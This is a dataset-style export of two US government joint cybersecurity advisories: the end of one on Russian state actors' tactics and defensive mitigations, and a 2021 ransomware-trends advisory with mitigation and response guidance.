Enforce Strong, Unique Passwords

Require accounts to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.
Enable password management functions, such as Local Administrator Password Solution (LAPS), for local administrative accounts. This will reduce the burden of users managing passwords and encourage them to have strong passwords.

Introduce Account Lockout and Time-Based Access Features

Implement time-out and lock-out features in response to repeated failed login attempts.
Configure time-based access for accounts set at the admin level and higher. For example, the Just-In-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need. When the account is needed, individual users submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion.

Reduce Credential Exposure

Use virtualization solutions on modern hardware and software to ensure credentials are securely stored, and protect credentials via capabilities, such as Windows Defender Credential Guard (CredGuard) and Trusted Platform Module (TPM).,8, Protecting domain credentials with CredGuard requires configuration and has limitations in protecting other types of credentials (e.g., WDigest and local accounts).,9,10, CredGuard uses TPMs to protect stored credentials. TPMs function as a system integrity observer and trust anchor ensuring the integrity of the boot sequence and mechanisms (e.g., UEFI Secure Boot). Installation of Windows 11 requires TPM v2.0.,11, Disabling WDigest and rolling expiring NTLM secrets in smartcards will further protect other credentials not protected by CredGuard.,12,13,

Establish Centralized Log Management

Create a centralized log management system. Centralized logging applications allow network defenders to look for anomalous activity, such as out-of-place communications between devices or unaccountable login failures, in the network environment. 

Forward all logs to a SIEM tool.
Ensure logs are searchable.
Retain critical and historic network activity logs for a minimum of 180 days. 


If using M365, enable Unified Audit Log (UAL)—M365’s logging capability—which contains events from Exchange Online, SharePoint online, OneDrive, Azure AD, Microsoft Teams, PowerBI, and other M365 services. 
Correlate logs, including M365 logs, from network and host security devices. This correlation will help with detecting anomalous activity in the network environment and connecting it with potential anomalous activity in M365. 

In addition to setting up centralized logging, organizations should:

Ensure PowerShell logging is turned on. Threat actors often use PowerShell to hide their malicious activities.,14, 
Update PowerShell instances to version 5.0 or later and uninstall all earlier versions of PowerShell. Logs from prior versions are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities. 
Confirm PowerShell 5.0 instances have module, script block, and transcription logging enabled.
Monitor remote access/Remote Desktop Protocol (RDP) logs and disable unused remote access/RDP ports.

Initiate a Software and Patch Management Program 

Consider using a centralized patch management system. Failure to deploy software patches in a timely manner makes an organization a target of opportunity, increasing its risk of compromise. Organizations can ensure timely patching of software vulnerabilities by implementing an enterprise-wide software and patch management program.,15, 

If an organization is unable to update all software shortly after a patch is released, prioritize patches for CVEs that are already known to be exploited or that would be accessible to the largest number of potential adversaries (such as internet-facing systems). 
Subscribe to CISA cybersecurity notifications and advisories to keep up with known exploited vulnerabilities, security updates, and threats. This will assist organizations in maintaining situational awareness of critical software vulnerabilities and, if applicable, associated exploitation. 


Sign up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats. CISA’s vulnerability scanning service evaluates external network presence by executing continuous scans of public, static IPs for accessible services and vulnerabilities.

Employ Antivirus Programs 

Ensure that antivirus applications are installed on all organizations’ computers and are configured to prevent spyware, adware, and malware as part of the operating system security baseline. 
Keep virus definitions up to date.
Regularly monitor antivirus scans. 

Use Endpoint Detection and Response Tools 

Utilize endpoint detection and response (EDR) tools. These tools allow a high degree of visibility into the security status of endpoints and can be an effective defense against threat actors. EDR tools are particularly useful for detecting lateral movement, as they have insight into common and uncommon network connections for each host. 

Maintain Rigorous Configuration Management Programs 

Audit configuration management programs to ensure they can track and mitigate emerging threats. Review system configurations for misconfigurations and security weaknesses. Having a robust configuration program hinders sophisticated threat operations by limiting the effectiveness of opportunistic attacks.,16, 

Enforce the Principle of Least Privilege

Apply the principle of least privilege. Administrator accounts should have the minimum permissions they need to do their tasks. This can reduce the impact if an administrator account is compromised.  
For M365, assign administrator roles to role-based access control (RBAC) to implement the principle of least privilege. Given its high level of default privilege, you should only use the Global Administrator account when absolutely necessary. Using Azure AD’s numerous other built-in administrator roles instead of the Global Administrator account can limit assigning unnecessary privileges. Note: refer to the Microsoft documentation, Azure AD built-in roles, for more information about Azure AD. 
Remove privileges not expressly required by an account’s function or role. 
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
Create non-privileged accounts for privileged users, and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access).
Reduce the number of domain and enterprise administrator accounts, and remove all accounts that are unnecessary.
Regularly audit administrative user accounts.
Regularly audit logs to ensure new accounts are legitimate users.
Institute a group policy that disables remote interactive logins, and use Domain Protected Users Group.

To assist with identifying suspicious behavior with administrative accounts:

Create privileged role tracking.
Create a change control process for all privilege escalations and role changes on user accounts.
Enable alerts on privilege escalations and role changes.
Log privileged user changes in the network environment, and create an alert for unusual events.

Review Trust Relationships

Review existing trust relationships with IT service providers, such as managed service providers (MSPs) and cloud service providers (CSPs). Threat actors are known to exploit trust relationships between providers and their customers to gain access to customer networks and data.  
Remove unnecessary trust relationships.  
Review contractual relationships with all service providers, and ensure contracts include: 

Security controls the customer deems appropriate. 
Appropriate monitoring and logging of provider-managed customer systems.
Appropriate monitoring of the service provider’s presence, activities, and connections to the customer network.
Notification of confirmed or suspected security events and incidents occurring on the provider’s infrastructure and administrative networks.



Note: review CISA’s page on APTs Targeting IT Service Provider Customers and CISA Insights: Mitigations and Hardening Guidance for MSPs and Small and Mid-sized Businesses for additional recommendations for MSP and CSP customers.
Encourage Remote Work Environment Best Practices
With the increase in remote work and use of VPN services due to COVID-19, the FBI, NSA, and CISA encourage regularly monitoring remote network traffic, along with employing the following best practices. Note: for additional information, see joint NSA-CISA Cybersecurity Information Sheet: Selecting and Hardening Remote Access VPN Solutions.

Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.
When possible, require MFA on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, mandate that employees engaging in remote work use strong passwords.
Monitor network traffic for unapproved and unexpected protocols.
Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry by adversaries.

Establish User Awareness Best Practices
Cyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI, NSA, and CISA recommend the following best practices to improve employee operational security when conducting business:

Provide end user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and how they are delivered. Also, provide users with training on information security principles and techniques.
Inform employees of the risks of social engineering attacks, e.g., risks associated with posting detailed career information to social or professional networking sites.
Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyber intrusion to help quickly and efficiently identify threats and employ mitigation strategies.

Apply Additional Best Practice Mitigations

Deny atypical inbound activity from known anonymization services, including commercial VPN services and The Onion Router (TOR).
Impose listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Identify and create offline backups for critical assets.
Implement network segmentation.
Review CISA Alert AA20-120A: Microsoft Office 365 Security Recommendations for additional recommendations on hardening M365 cloud environments.

Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s Rewards for Justice Program. You may be eligible for a reward of up to $10 million, which the Department is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact (202) 702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details, refer to rewardsforjustice.net.
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. The FBI, NSA, and CISA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the FBI, NSA, or CISA. 

Contact Information

To report suspicious activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov. For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at (410) 854-4200 or Cybersecurity_Requests@nsa.gov. Defense Industrial Base companies may additionally sign up for NSA’s free cybersecurity services, including Protective DNS, vulnerability scanning, and threat intelligence collaboration at dib_defense@cyber.nsa.gov. 
Appendix: Detailed Tactics, Techniques, and Procedures
Reconnaissance,
Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. The adversary is known for harvesting login credentials,.,17,
 

 
Initial Access,
Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. For example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion,.,18, These specific actors obtained and abused credentials of domain, and cloud accounts,.,19, The actors also used external remote services to gain access to systems,.,20, The adversary took advantage of weaknesses in internet-facing servers and conducted SQL injection attacks against organizations' external websites,.,21, Finally, they sent spearphishing emails with a malicious link in an attempt to gain access,.,22, 
 
 

 
Persistence,
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion,.,23, 
 

Privilege Escalation,
Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion,.,24,  Specifically in this case, credentials of cloud accounts, were obtained and abused.,25,   
 

Defense Evasion,
Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit,.,26, 
 

 
Credential Access,
Credential Access consists of techniques for stealing credentials like account names and passwords. The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights,.,27, The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials,.,28, 

Discovery,
Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system,.,29,  In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments,.,30, 

 
Collection,
Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives. The adversary leverages information repositories, such as SharePoint, to mine valuable information,.,31,   

 
Command and Control,
Command and Control (C2) consists of techniques that adversaries may use to communicate with systems under their control within a victim network. The adversary chained together multiple proxies to disguise the source of malicious traffic. In this case, TOR and VPN servers are used as multi-hop proxies to route C2 traffic and obfuscate their activities,.,32, 
 

 
Additional Resources,1, NSA, CISA, FBI, NCSC Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments, 1 July 2021.,2, NSA Cybersecurity Advisory: Mitigating Recent VPN Vulnerabilities, 7 October 2019.,3, NSA, CISA, FBI, NCSC Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments, 1 July 2021.,4, Microsoft Article: AD Forest Recovery – Resetting the krbtgt password, 29 July 2021.,5, Microsoft GitHub: New-KrbtgtKeys.ps1, 14 May 2020.,6, NSA Cybersecurity Information: Defend Privileges and Accounts, August 2019.,7, Microsoft Article: Group Managed Service Accounts Overview, 29 July 2021.,8, NSA Cybersecurity Information: Leverage Modern Hardware Security Features, August 2019.,9, Microsoft Article: Protect derived domain credentials with Windows Defender Credential Guard, 3 December 2021.,10, Microsoft Article: Windows Defender Credential Guard protection limits, 3 December 2021.,11, Microsoft Article: Windows 11 requirements, 30 November 2021.,12, Microsoft Blog Post: The Importance of KB2871997 and KB2928120 for Credential Protection, 20 September 2021.,13, Microsoft Article: What’s New in Credential Protection, 7 January 2022.,14, NSA Cybersecurity Factsheet: PowerShell: Security Risks and Defenses, 1 December 2016.,15, NSA Cybersecurity Information: Update and Upgrade Software Immediately, August 2019.,16, NSA Cybersecurity Information: Actively Manage Systems and Configurations, August 2019.,17, MITRE Groups: APT28, 18 October 2021.,18, MITRE Groups: APT28, 18 October 2021.,19, MITRE Software: Cobalt Strike, 18 October 2021.,20, Based on technical information shared by Mandiant.,21, MITRE Groups: APT28, 18 October 2021.,22, Based on technical information shared by Mandiant.,23, MITRE Groups: APT28, 18 October 2021.,24, MITRE Groups: APT28, 18 October 2021.,25, MITRE Software: Cobalt Strike, 18 October 2021.,26, MITRE Software: Fysbis, 6 November 2020.,27, MITRE Software: Koadic, 30 March 2020.,28, MITRE Groups: APT28, 18 October 2021.,29, Based on technical information shared by Mandiant.,30, Based on technical information shared by Mandiant.,31, MITRE Groups: APT28, 18 October 2021.,32, MITRE Groups: APT28, 18 October 2021.

Revisions

February 16, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-047a
56,"




Summary

Immediate Actions You Can Take Now to Protect Against Ransomware: • Update your operating system and software.
• Implement user training and phishing exercises to raise awareness about the risk of suspicious links and attachments.
• If you use Remote Desktop Protocol (RDP), secure and monitor it.
• Make an offline backup of your data.
• Use multifactor authentication (MFA).
In 2021, cybersecurity authorities in the United States,[1][2][3] Australia,[4] and the United Kingdom[5] observed an increase in sophisticated, high-impact ransomware incidents against critical infrastructure organizations globally. The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the National Security Agency (NSA) observed incidents involving ransomware against 14 of the 16 U.S. critical infrastructure sectors, including the Defense Industrial Base, Emergency Services, Food and Agriculture, Government Facilities, and Information Technology Sectors. The Australian Cyber Security Centre (ACSC) observed continued ransomware targeting of Australian critical infrastructure entities, including in the Healthcare and Medical, Financial Services and Markets, Higher Education and Research, and Energy Sectors. The United Kingdom’s National Cyber Security Centre (NCSC-UK) recognizes ransomware as the biggest cyber threat facing the United Kingdom. Education is one of the top UK sectors targeted by ransomware actors, but the NCSC-UK has also seen attacks targeting businesses, charities, the legal profession, and public services in the Local Government and Health Sectors.
Ransomware tactics and techniques continued to evolve in 2021, which demonstrates ransomware threat actors’ growing technological sophistication and an increased ransomware threat to organizations globally.
This joint Cybersecurity Advisory—authored by cybersecurity authorities in the United States, Australia, and the United Kingdom—provides observed behaviors and trends as well as mitigation recommendations to help network defenders reduce their risk of compromise by ransomware.
Click here for a PDF version of this report.

Technical Details

Cybersecurity authorities in the United States, Australia, and the United Kingdom observed the following behaviors and trends among cyber criminals in 2021:

Gaining access to networks via phishing, stolen Remote Desktop Protocols (RDP) credentials or brute force, and exploiting vulnerabilities. Phishing emails, RDP exploitation, and exploitation of software vulnerabilities remained the top three initial infection vectors for ransomware incidents in 2021. Once a ransomware threat actor has gained code execution on a device or network access, they can deploy ransomware. Note: these infection vectors likely remain popular because of the increased use of remote work and schooling starting in 2020 and continuing through 2021. This increase expanded the remote attack surface and left network defenders struggling to keep pace with routine software patching.
Using cybercriminal services-for-hire. The market for ransomware became increasingly “professional” in 2021, and the criminal business model of ransomware is now well established. In addition to their increased use of ransomware-as-a-service (RaaS), ransomware threat actors employed independent services to negotiate payments, assist victims with making payments, and arbitrate payment disputes between themselves and other cyber criminals. NCSC-UK observed that some ransomware threat actors offered their victims the services of a 24/7 help center to expedite ransom payment and restoration of encrypted systems or data.

Note: cybersecurity authorities in the United States, Australia, and the United Kingdom assess that if the ransomware criminal business model continues to yield financial returns for ransomware actors, ransomware incidents will become more frequent. Every time a ransom is paid, it confirms the viability and financial attractiveness of the ransomware criminal business model. Additionally, cybersecurity authorities in the United States, Australia, and the United Kingdom note that the criminal business model often complicates attribution because there are complex networks of developers, affiliates, and freelancers; it is often difficult to identify conclusively the actors behind a ransomware incident.

Sharing victim information. Eurasian ransomware groups have shared victim information with each other, diversifying the threat to targeted organizations. For example, after announcing its shutdown, the BlackMatter ransomware group transferred its existing victims to infrastructure owned by another group, known as Lockbit 2.0. In October 2021, Conti ransomware actors began selling access to victims’ networks, enabling follow-on attacks by other cyber threat actors.
Shifting away from “big-game” hunting in the United States. 

In the first half of 2021, cybersecurity authorities in the United States and Australia observed ransomware threat actors targeting “big game” organizations—i.e., perceived high-value organizations and/or those that provide critical services—in several high-profile incidents. These victims included Colonial Pipeline Company, JBS Foods, and Kaseya Limited. However, ransomware groups suffered disruptions from U.S. authorities in mid-2021. Subsequently, the FBI observed some ransomware threat actors redirecting ransomware efforts away from “big-game” and toward mid-sized victims to reduce scrutiny. 
The ACSC observed ransomware continuing to target Australian organizations of all sizes, including critical services and “big game,” throughout 2021. 
NCSC-UK observed targeting of UK organizations of all sizes throughout the year, with some “big game” victims. Overall victims included businesses, charities, the legal profession, and public services in the Education, Local Government, and Health Sectors.


Diversifying approaches to extorting money. After encrypting victim networks, ransomware threat actors increasingly used “triple extortion” by threatening to (1) publicly release stolen sensitive information, (2) disrupt the victim’s internet access, and/or (3) inform the victim’s partners, shareholders, or suppliers about the incident. The ACSC continued to observe “double extortion” incidents in which a threat actor uses a combination of encryption and data theft to pressure victims to pay ransom demands. 

Ransomware groups have increased their impact by:

Targeting the cloud. Ransomware developers targeted cloud infrastructures to exploit known vulnerabilities in cloud applications, virtual machine software, and virtual machine orchestration software. Ransomware threat actors also targeted cloud accounts, cloud application programming interfaces (APIs), and data backup and storage systems to deny access to cloud resources and encrypt data. In addition to exploiting weaknesses to gain direct access, threat actors sometimes reach cloud storage systems by compromising local (on-premises) devices and moving laterally to the cloud systems. Ransomware threat actors have also targeted cloud service providers to encrypt large amounts of customer data.
Targeting managed service providers. Ransomware threat actors have targeted managed service providers (MSPs). MSPs have widespread and trusted accesses into client organizations. By compromising an MSP, a ransomware threat actor could access multiple victims through one initial compromise. Cybersecurity authorities in the United States, Australia, and the United Kingdom assess there will be an increase in ransomware incidents where threat actors target MSPs to reach their clients.
Attacking industrial processes. Although most ransomware incidents against critical infrastructure affect business information and technology systems, the FBI observed that several ransomware groups have developed code designed to stop critical infrastructure or industrial processes.
Attacking the software supply chain. Globally, in 2021, ransomware threat actors targeted software supply chain entities to subsequently compromise and extort their customers. Targeting software supply chains allows ransomware threat actors to increase the scale of their attacks by accessing multiple victims through a single initial compromise. 
Targeting organizations on holidays and weekends. The FBI and CISA observed cybercriminals conducting increasingly impactful attacks against U.S. entities on holidays and weekends throughout 2021. Ransomware threat actors may view holidays and weekends—when offices are normally closed—as attractive timeframes, as there are fewer network defenders and IT support personnel at victim organizations. For more information, see joint FBI-CISA Cybersecurity Advisory, Ransomware Awareness for Holidays and Weekends.


Mitigations

Cybersecurity authorities in the United States, Australia, and the United Kingdom recommend network defenders apply the following mitigations to reduce the likelihood and impact of ransomware incidents:

Keep all operating systems and software up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Regularly check for software updates and end of life (EOL) notifications, and prioritize patching known exploited vulnerabilities. In cloud environments, ensure that virtual machines, serverless applications, and third-party libraries are also patched regularly, as doing so is usually the customer’s responsibility. Automate software security scanning and testing when possible. Consider upgrading hardware and software, as necessary, to take advantage of vendor-provided virtualization and security capabilities.
If you use RDP or other potentially risky services, secure and monitor them closely.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a virtual private network (VPN), virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389). 
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established.
Open document readers in protected viewing modes to help prevent active content from running.


Implement a user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails. 
Require MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups. 
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access. Note: devices with local admin accounts should implement a password policy, possibly using a password management solution (e.g., Local Administrator Password Solution [LAPS]), that requires strong, unique passwords for each admin account.
If using Linux, use a Linux security module (such as SELinux, AppArmor, or SecComp) for defense in depth. The security modules may prevent the operating system from making arbitrary connections, which is an effective mitigation strategy against ransomware, as well as against remote code execution (RCE).
Protect cloud storage by backing up to multiple locations, requiring MFA for access, and encrypting data in the cloud. If using cloud-based key management for encryption, ensure that storage and key administration roles are separated.

Malicious cyber actors use system and network discovery techniques for network and system visibility and mapping. To limit an adversary’s ability to learn an organization’s enterprise environment and to move laterally, take the following actions: 

Segment networks. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Organizations with an international footprint should be aware that connectivity between their overseas arms can expand their threat surface; these organizations should implement network segmentation between international divisions where appropriate. For example, the ACSC has observed ransomware and data theft incidents in which Australian divisions of multinational companies were impacted by ransomware incidents affecting assets maintained and hosted by offshore divisions (outside their control).
Implement end-to-end encryption. Deploying mutual Transport Layer Security (mTLS) can prevent eavesdropping on communications, which, in turn, can prevent cyber threat actors from gaining insights needed to advance a ransomware attack.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network-monitoring tool. To aid in detecting the ransomware, leverage a tool that logs and reports all network traffic, including lateral movement on a network. Endpoint detection and response tools are particularly useful for detecting lateral connections as they have insight into unusual network connections for each host. Artificial intelligence (AI)-enabled network intrusion detection systems (NIDS) are also able to detect and block many anomalous behaviors associated with early stages of ransomware deployment.
Document external remote connections. Organizations should document approved solutions for remote management and maintenance. If an unapproved solution is installed on a workstation, the organization should investigate it immediately. These solutions have legitimate purposes, so they will not be flagged by antivirus vendors.
Implement time-based access for privileged accounts. For example, the just-in-time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the zero trust model) by setting network-wide policy to automatically disable admin accounts at the Active Directory level. As needed, individual users can submit requests through an automated process that enables access to a system for a set timeframe. In cloud environments, just-in-time elevation is also appropriate and may be implemented using per-session federated claims or privileged access management tools.
Enforce principle of least privilege through authorization policies. Minimize unnecessary privileges for identities. Consider privileges assigned to human identities as well as non-person (e.g., software) identities. In cloud environments, non-person identities (service accounts or roles) with excessive privileges are a key vector for lateral movement and data access. Account privileges should be clearly defined, narrowly scoped, and regularly audited against usage patterns.
Reduce credential exposure. Accounts and their credentials present on hosts can enable further compromise of a network. Enforcing credential protection—by restricting where accounts and credentials can be used and by using local device credential protection features—reduces opportunities for threat actors to collect credentials for lateral movement and privilege escalation.
Disable unneeded command-line utilities; constrain scripting activities and permissions, and monitor their usage. Privilege escalation and lateral movement often depend on software utilities that run from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. Organizations should also disable macros sent from external sources via Group Policy.
Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from an attack as well as protect against data losses. In cloud environments, consider leveraging native cloud service provider backup and restoration capabilities. To further secure cloud backups, consider separation of account roles to prevent an account that manages the backups from being used to deny or degrade the backups should the account become compromised. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Consider storing encryption keys outside the cloud. Cloud backups that are encrypted using a cloud key management service (KMS) could be affected should the cloud environment become compromised. 
Collect telemetry from cloud environments. Ensure that telemetry from cloud environments—including network telemetry (e.g., virtual private cloud [VPC] flow logs), identity telemetry (e.g., account sign-on, token usage, federation configuration changes), and application telemetry (e.g., file downloads, cross-organization sharing)—is retained and visible to the security team.

Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more recommendations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to ransomware. 
Responding to Ransomware Attacks
If a ransomware incident occurs at your organization, cybersecurity authorities in the United States, Australia, and the United Kingdom recommend organizations:

Follow the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Report incidents to respective cybersecurity authorities:

U.S. organizations should report incidents immediately to the FBI at a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office. 
Australian organizations should report incidents to the ASD’s ACSC via cyber.gov.au or call 1300 292 371 (1300 CYBER 1).
UK organizations should report incidents to NCSC-UK via report.ncsc.gov.uk and/or Action Fraud, the United Kingdom’s fraud and cyber reporting centre, via actionfraud.police.uk.


Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: cybersecurity authorities in the United States, Australia, and the United Kingdom strongly discourage paying a ransom to criminal actors. Criminal activity is motivated by financial gain, so paying a ransom may embolden adversaries to target additional organizations (or re-target the same organization) or encourage cyber criminals to engage in the distribution of ransomware. Paying the ransom also does not guarantee that a victim’s files will be recovered. Additionally, reducing the financial gain of ransomware threat actors will help disrupt the ransomware criminal business model.
Additionally, NCSC-UK reminds UK organizations that paying criminals is not condoned by the UK Government. In instances where a ransom paid, victim organizations often cease engagement with authorities, who then lose visibility of the payments made. While it continues to prove challenging, the NCSC-UK has supported UK Government efforts by identifying needed policy changes—including measures about the cyber insurance industry and ransom payments—that could reduce the threat of ransomware. 
Resources

For more information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, U.S. whole-of-government webpage providing ransomware resources and alerts.
CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
The ACSC recommends organizations implement eight essential mitigation strategies from the ACSC’s Strategies to Mitigate Cyber Security Incidents as a cybersecurity baseline. These strategies, known as the “Essential Eight,” make it much harder for adversaries to compromise systems.
Refer to the ACSC’s practical guides on how to protect yourself against ransomware attacks and what to do if you are held to ransom at cyber.gov.au.
Refer to NCSC-UK’s guides on how to protect yourself against ransomware attacks and how to respond to and recover from them at ncsc.gov.uk/ransomware/home. 

Disclaimer
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, NSA, ACSC, and NCSC-UK do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation.

References

[1] United States Federal Bureau of Investigation
[2] United States Cybersecurity and Infrastructure Security Agency
[3] United States National Security Agency
[4] Australian Cyber Security Centre
[5] United Kingdom National Cyber Security Centre

Revisions

February 9, 2022: Initial Version|February 10, 2022: Replaced PDF with 508 compliant PDF






This product is provided subject to this Notification and this Privacy & Use policy.


",set(),"




Summary

Immediate Actions You Can Take Now to Protect Against Ransomware: • Update your operating system and software.
• Implement user training and phishing exercises to raise awareness about the risk of suspicious links and attachments.
• If you use Remote Desktop Protocol (RDP), secure and monitor it.
• Make an offline backup of your data.
• Use multifactor authentication (MFA).
In 2021, cybersecurity authorities in the United States,1,2,3, Australia,4, and the United Kingdom,5, observed an increase in sophisticated, high-impact ransomware incidents against critical infrastructure organizations globally. The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the National Security Agency (NSA) observed incidents involving ransomware against 14 of the 16 U.S. critical infrastructure sectors, including the Defense Industrial Base, Emergency Services, Food and Agriculture, Government Facilities, and Information Technology Sectors. The Australian Cyber Security Centre (ACSC) observed continued ransomware targeting of Australian critical infrastructure entities, including in the Healthcare and Medical, Financial Services and Markets, Higher Education and Research, and Energy Sectors. The United Kingdom’s National Cyber Security Centre (NCSC-UK) recognizes ransomware as the biggest cyber threat facing the United Kingdom. Education is one of the top UK sectors targeted by ransomware actors, but the NCSC-UK has also seen attacks targeting businesses, charities, the legal profession, and public services in the Local Government and Health Sectors.
Ransomware tactics and techniques continued to evolve in 2021, which demonstrates ransomware threat actors’ growing technological sophistication and an increased ransomware threat to organizations globally.
This joint Cybersecurity Advisory—authored by cybersecurity authorities in the United States, Australia, and the United Kingdom—provides observed behaviors and trends as well as mitigation recommendations to help network defenders reduce their risk of compromise by ransomware.
Click here for a PDF version of this report.

Technical Details

Cybersecurity authorities in the United States, Australia, and the United Kingdom observed the following behaviors and trends among cyber criminals in 2021:

